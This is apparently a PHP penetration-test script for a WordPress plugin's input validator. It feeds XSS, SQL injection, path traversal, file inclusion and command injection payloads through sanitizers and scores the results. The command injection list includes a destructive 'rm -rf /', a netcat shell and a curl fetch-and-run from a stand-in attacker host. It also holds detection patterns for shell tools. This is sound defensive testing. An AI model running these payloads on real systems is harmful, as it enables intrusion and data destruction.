<?php
/**
 * Security Penetration Testing Script for Live Admin Styler
 * 
 * This script performs comprehensive security testing including:
 * - XSS attack vectors
 * - SQL injection attempts
 * - CSRF protection validation
 * - Input sanitization verification
 * - Rate limiting tests
 * 
 * @package LiveAdminStyler
 * @subpackage SecurityTests
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit('Direct access not allowed');
}

/**
 * Security Penetration Tester class
 */
class LAS_Security_Penetration_Tester {
    
    /**
     * Security validator instance
     * @var LAS_Security_Validator
     */
    private $validator;
    
    /**
     * Test results
     * @var array
     */
    private $results = [];
    
    /**
     * Constructor
     */
    public function __construct() {
        $this->validator = new LAS_Security_Validator();
    }
    
    /**
     * Run all security tests
     * 
     * @return array Test results
     */
    public function run_all_tests() {
        echo "Starting Live Admin Styler Security Penetration Tests...\n\n";
        
        $this->test_xss_vectors();
        $this->test_sql_injection_vectors();
        $this->test_csrf_protection();
        $this->test_input_validation();
        $this->test_rate_limiting();
        $this->test_file_inclusion();
        $this->test_command_injection();
        $this->test_path_traversal();
        
        $this->generate_report();
        
        return $this->results;
    }
    
    /**
     * Test XSS attack vectors
     */
    private function test_xss_vectors() {
        echo "Testing XSS Attack Vectors...\n";
        
        $xss_payloads = [
            // Basic XSS
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            
            // Event handler XSS
            '<div onclick="alert(\'XSS\')">Click me</div>',
            '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
            '<body onload="alert(\'XSS\')">',
            '<marquee onstart="alert(\'XSS\')">',
            
            // CSS-based XSS
            '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
            '<div style="background:expression(alert(\'XSS\'))">',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
            
            // URL-based XSS
            'javascript:alert("XSS")',
            'vbscript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            
            // Encoded XSS
            '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
            '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',
            
            // Filter bypass attempts
            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
            '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
            
            // Modern XSS vectors
            '<svg><animatetransform onbegin=alert("XSS")>',
            '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">',
            '<template><script>alert("XSS")</script></template>',
        ];
        
        $passed = 0;
        $total = count($xss_payloads);
        
        foreach ($xss_payloads as $payload) {
            $sanitized_text = $this->validator->sanitize_text($payload);
            $sanitized_css = $this->validator->sanitize_css($payload);
            $sanitized_url = $this->validator->sanitize_url($payload);
            
            $is_safe = $this->is_xss_safe($sanitized_text) && 
                      $this->is_xss_safe($sanitized_css) && 
                      $this->is_xss_safe($sanitized_url);
            
            if ($is_safe) {
                $passed++;
            } else {
                $this->results['xss_failures'][] = [
                    'payload' => $payload,
                    'sanitized_text' => $sanitized_text,
                    'sanitized_css' => $sanitized_css,
                    'sanitized_url' => $sanitized_url
                ];
            }
        }
        
        $this->results['xss_test'] = [
            'passed' => $passed,
            'total' => $total,
            'success_rate' => round(($passed / $total) * 100, 2)
        ];
        
        echo "XSS Tests: $passed/$total passed ({$this->results['xss_test']['success_rate']}%)\n\n";
    }
    
    /**
     * Check if sanitized content is safe from XSS
     * 
     * @param string $content Sanitized content
     * @return bool True if safe, false if potentially dangerous
     */
    private function is_xss_safe($content) {
        $dangerous_patterns = [
            '/<script/i',
            '/<iframe/i',
            '/<object/i',
            '/<embed/i',
            '/<applet/i',
            '/<meta/i',
            '/<link/i',
            '/javascript:/i',
            '/vbscript:/i',
            '/data:.*script/i',
            '/on\w+\s*=/i', // Event handlers
            '/expression\s*\(/i',
            '/@import/i',
            '/behavior\s*:/i'
        ];
        
        foreach ($dangerous_patterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return false;
            }
        }
        
        return true;
    }
    
    /**
     * Test SQL injection vectors
     */
    private function test_sql_injection_vectors() {
        echo "Testing SQL Injection Vectors...\n";
        
        $sql_payloads = [
            // Basic SQL injection
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1--",
            
            // Blind SQL injection
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' AND SUBSTRING(@@version,1,1)='5'--",
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
            
            // Time-based SQL injection
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--",
            "1' OR BENCHMARK(1000000,MD5(1))--",
            
            // Error-based SQL injection
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            // Advanced techniques
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' ORDER BY 10--",
            "1' GROUP BY 1,2,3,4,5--",
            
            // Encoded payloads
            "1%27%20OR%20%271%27%3D%271",
            "1' OR CHAR(65)=CHAR(65)--",
            
            // NoSQL injection
            "'; return true; var x='",
            "' || '1'=='1",
            "'; return this.username == 'admin' && this.password == 'password'; var x='"
        ];
        
        $passed = 0;
        $total = count($sql_payloads);
        
        foreach ($sql_payloads as $payload) {
            $is_detected = $this->validator->has_sql_injection($payload);
            
            if ($is_detected) {
                $passed++;
            } else {
                $this->results['sql_failures'][] = $payload;
            }
        }
        
        $this->results['sql_test'] = [
            'passed' => $passed,
            'total' => $total,
            'success_rate' => round(($passed / $total) * 100, 2)
        ];
        
        echo "SQL Injection Tests: $passed/$total detected ({$this->results['sql_test']['success_rate']}%)\n\n";
    }
    
    /**
     * Test CSRF protection
     */
    private function test_csrf_protection() {
        echo "Testing CSRF Protection...\n";
        
        $tests = [
            'valid_nonce' => wp_create_nonce('las_ajax_nonce'),
            'invalid_nonce' => 'invalid_nonce_value',
            'empty_nonce' => '',
            'expired_nonce' => 'expired_nonce_simulation',
            'wrong_action' => wp_create_nonce('wrong_action')
        ];
        
        $passed = 0;
        $total = count($tests);
        
        foreach ($tests as $test_name => $nonce) {
            $is_valid = $this->validator->verify_nonce($nonce, 'las_ajax_nonce');
            
            if ($test_name === 'valid_nonce' && $is_valid) {
                $passed++;
            } elseif ($test_name !== 'valid_nonce' && !$is_valid) {
                $passed++;
            } else {
                $this->results['csrf_failures'][] = [
                    'test' => $test_name,
                    'nonce' => $nonce,
                    'expected_valid' => $test_name === 'valid_nonce',
                    'actual_valid' => $is_valid
                ];
            }
        }
        
        $this->results['csrf_test'] = [
            'passed' => $passed,
            'total' => $total,
            'success_rate' => round(($passed / $total) * 100, 2)
        ];
        
        echo "CSRF Tests: $passed/$total passed ({$this->results['csrf_test']['success_rate']}%)\n\n";
    }
    
    /**
     * Test input validation
     */
    private function test_input_validation() {
        echo "Testing Input Validation...\n";
        
        $validation_tests = [
            // Color validation
            ['type' => 'color', 'input' => '#ff0000', 'expected_valid' => true],
            ['type' => 'color', 'input' => 'rgb(255,0,0)', 'expected_valid' => true],
            ['type' => 'color', 'input' => 'invalid_color', 'expected_valid' => false],
            ['type' => 'color', 'input' => 'javascript:alert(1)', 'expected_valid' => false],
            
            // Number validation
            ['type' => 'number', 'input' => '123', 'expected_valid' => true],
            ['type' => 'number', 'input' => '-456', 'expected_valid' => true],
            ['type' => 'number', 'input' => 'abc', 'expected_valid' => false],
            ['type' => 'number', 'input' => '123; DROP TABLE users;', 'expected_valid' => false],
            
            // URL validation
            ['type' => 'url', 'input' => 'https://example.com', 'expected_valid' => true],
            ['type' => 'url', 'input' => 'javascript:alert(1)', 'expected_valid' => false],
            ['type' => 'url', 'input' => 'ftp://example.com', 'expected_valid' => false],
            
            // Boolean validation
            ['type' => 'boolean', 'input' => 'true', 'expected_valid' => true],
            ['type' => 'boolean', 'input' => '1', 'expected_valid' => true],
            ['type' => 'boolean', 'input' => 'false', 'expected_valid' => true],
            ['type' => 'boolean', 'input' => '0', 'expected_valid' => true],
        ];
        
        $passed = 0;
        $total = count($validation_tests);
        
        foreach ($validation_tests as $test) {
            $sanitized = $this->validator->sanitize_ajax_input($test['input'], $test['type']);
            $is_valid = $this->is_validation_result_valid($test['type'], $test['input'], $sanitized, $test['expected_valid']);
            
            if ($is_valid) {
                $passed++;
            } else {
                $this->results['validation_failures'][] = $test;
            }
        }
        
        $this->results['validation_test'] = [
            'passed' => $passed,
            'total' => $total,
            'success_rate' => round(($passed / $total) * 100, 2)
        ];
        
        echo "Input Validation Tests: $passed/$total passed ({$this->results['validation_test']['success_rate']}%)\n\n";
    }
    
    /**
     * Check if validation result is correct
     */
    private function is_validation_result_valid($type, $input, $sanitized, $expected_valid) {
        switch ($type) {
            case 'color':
                return $expected_valid ? !empty($sanitized) : empty($sanitized);
            case 'number':
                return $expected_valid ? is_numeric($sanitized) : ($sanitized === 0 && !is_numeric($input));
            case 'url':
                return $expected_valid ? !empty($sanitized) : empty($sanitized);
            case 'boolean':
                return is_bool($sanitized);
            default:
                return true;
        }
    }
    
    /**
     * Test rate limiting
     */
    private function test_rate_limiting() {
        echo "Testing Rate Limiting...\n";
        
        $action = 'test_rate_limit';
        $limit = 5;
        $passed = 0;
        $total = $limit + 2; // Test within limit + 2 over limit
        
        // Test within limit
        for ($i = 0; $i < $limit; $i++) {
            if ($this->validator->check_rate_limit($action, $limit)) {
                $passed++;
            }
        }
        
        // Test exceeding limit
        for ($i = 0; $i < 2; $i++) {
            if (!$this->validator->check_rate_limit($action, $limit)) {
                $passed++;
            }
        }
        
        $this->results['rate_limit_test'] = [
            'passed' => $passed,
            'total' => $total,
            'success_rate' => round(($passed / $total) * 100, 2)
        ];
        
        echo "Rate Limiting Tests: $passed/$total passed ({$this->results['rate_limit_test']['success_rate']}%)\n\n";
    }
    
    /**
     * Test file inclusion vulnerabilities
     */
    private function test_file_inclusion() {
        echo "Testing File Inclusion Protection...\n";
        
        $file_inclusion_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'php://filter/read=convert.base64-encode/resource=index.php',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
            'expect://id',
            '/proc/self/environ',
            'file:///etc/passwd'
        ];
        
        $passed = 0;
        $total = count($file_inclusion_payloads);
        
        foreach ($file_inclusion_payloads as $payload) {
            $sanitized = $this->validator->sanitize_text($payload);
            
            // Check if dangerous patterns are removed
            $is_safe = !preg_match('/\.\.[\/\\\\]/', $sanitized) &&
                      !preg_match('/php:\/\//', $sanitized) &&
                      !preg_match('/data:\/\//', $sanitized) &&
                      !preg_match('/file:\/\//', $sanitized) &&
                      !preg_match('/expect:\/\//', $sanitized) &&
                      !preg_match('/\/proc\//', $sanitized);
            
            if ($is_safe) {
                $passed++;
            } else {
                $this->results['file_inclusion_failures'][] = [
                    'payload' => $payload,
                    'sanitized' => $sanitized
                ];
            }
        }
        
        $this->results['file_inclusion_test'] = [
            'passed' => $passed,
            'total' => $total,
            'success_rate' => round(($passed / $total) * 100, 2)
        ];
        
        echo "File Inclusion Tests: $passed/$total passed ({$this->results['file_inclusion_test']['success_rate']}%)\n\n";
    }
    
    /**
     * Test command injection protection
     */
    private function test_command_injection() {
        echo "Testing Command Injection Protection...\n";
        
        $command_injection_payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& whoami',
            '|| id',
            '`whoami`',
            '$(whoami)',
            '; rm -rf /',
            '| nc -l -p 1234 -e /bin/sh',
            '; curl http://evil.com/shell.sh | sh'
        ];
        
        $passed = 0;
        $total = count($command_injection_payloads);
        
        foreach ($command_injection_payloads as $payload) {
            $sanitized = $this->validator->sanitize_text($payload);
            
            // Check if command injection patterns are removed
            $is_safe = !preg_match('/[;&|`$()]/', $sanitized) &&
                      !preg_match('/\b(ls|cat|whoami|id|rm|nc|curl|sh|bash|cmd|powershell)\b/i', $sanitized);
            
            if ($is_safe) {
                $passed++;
            } else {
                $this->results['command_injection_failures'][] = [
                    'payload' => $payload,
                    'sanitized' => $sanitized
                ];
            }
        }
        
        $this->results['command_injection_test'] = [
            'passed' => $passed,
            'total' => $total,
            'success_rate' => round(($passed / $total) * 100, 2)
        ];
        
        echo "Command Injection Tests: $passed/$total passed ({$this->results['command_injection_test']['success_rate']}%)\n\n";
    }
    
    /**
     * Test path traversal protection
     */
    private function test_path_traversal() {
        echo "Testing Path Traversal Protection...\n";
        
        $path_traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc0x2fpasswd'
        ];
        
        $passed = 0;
        $total = count($path_traversal_payloads);
        
        foreach ($path_traversal_payloads as $payload) {
            $sanitized = $this->validator->sanitize_text($payload);
            
            // Check if path traversal patterns are removed
            $is_safe = !preg_match('/\.\.[\/\\\\]/', $sanitized) &&
                      !preg_match('/%2e%2e%2f/i', $sanitized) &&
                      !preg_match('/%252f/i', $sanitized) &&
                      !preg_match('/0x2e/i', $sanitized);
            
            if ($is_safe) {
                $passed++;
            } else {
                $this->results['path_traversal_failures'][] = [
                    'payload' => $payload,
                    'sanitized' => $sanitized
                ];
            }
        }
        
        $this->results['path_traversal_test'] = [
            'passed' => $passed,
            'total' => $total,
            'success_rate' => round(($passed / $total) * 100, 2)
        ];
        
        echo "Path Traversal Tests: $passed/$total passed ({$this->results['path_traversal_test']['success_rate']}%)\n\n";
    }
    
    /**
     * Generate comprehensive security report
     */
    private function generate_report() {
        echo "=== SECURITY PENETRATION TEST REPORT ===\n\n";
        
        $overall_score = 0;
        $test_count = 0;
        
        foreach ($this->results as $test_name => $result) {
            if (isset($result['success_rate'])) {
                echo strtoupper(str_replace('_', ' ', $test_name)) . ": {$result['success_rate']}%\n";
                $overall_score += $result['success_rate'];
                $test_count++;
            }
        }
        
        $overall_score = $test_count > 0 ? round($overall_score / $test_count, 2) : 0;
        
        echo "\nOVERALL SECURITY SCORE: {$overall_score}%\n\n";
        
        // Security recommendations
        if ($overall_score < 95) {
            echo "SECURITY RECOMMENDATIONS:\n";
            
            if (isset($this->results['xss_failures']) && !empty($this->results['xss_failures'])) {
                echo "- Review XSS protection mechanisms\n";
            }
            
            if (isset($this->results['sql_failures']) && !empty($this->results['sql_failures'])) {
                echo "- Strengthen SQL injection detection\n";
            }
            
            if (isset($this->results['csrf_failures']) && !empty($this->results['csrf_failures'])) {
                echo "- Improve CSRF protection\n";
            }
            
            echo "\n";
        }
        
        // Save detailed report
        $report_file = WP_CONTENT_DIR . '/las-security-report-' . date('Y-m-d-H-i-s') . '.json';
        file_put_contents($report_file, json_encode($this->results, JSON_PRETTY_PRINT));
        echo "Detailed report saved to: $report_file\n";
    }
}

// Run the security tests if called directly
if (defined('WP_CLI') && WP_CLI) {
    $tester = new LAS_Security_Penetration_Tester();
    $tester->run_all_tests();
}